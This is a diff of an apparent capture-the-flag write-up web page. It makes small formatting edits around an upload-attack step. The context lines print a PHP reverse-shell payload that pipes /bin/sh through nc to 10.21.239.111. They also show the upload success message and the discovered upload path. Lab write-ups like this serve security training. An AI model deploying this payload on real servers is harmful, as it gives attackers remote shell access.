@@ -1999,7 +1999,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="467 words"
+  title="472 words"
 >
   <em>2 min</em> read</span>
 
@@ -2084,8 +2084,9 @@
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"mkfifo /tmp/f; nc 10.21.239.111 666 &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1"</span><span class="p">);</span> <span class="cp">?&gt;</span>
 </pre></td></tr></tbody></table></code></div></div>
-<p>After sending it, the response said:
-File uploaded successfully! Maybe look in source code to see the path.</p>
+<p>After sending it, we get a message in the response saying:</p>
+
+<p><code class="language-plaintext highlighter-rouge">File uploaded successfully! Maybe look in source code to see the path.</code></p>
 
 <p>The source revealed the upload path: /upload_thm_1001.</p>
 
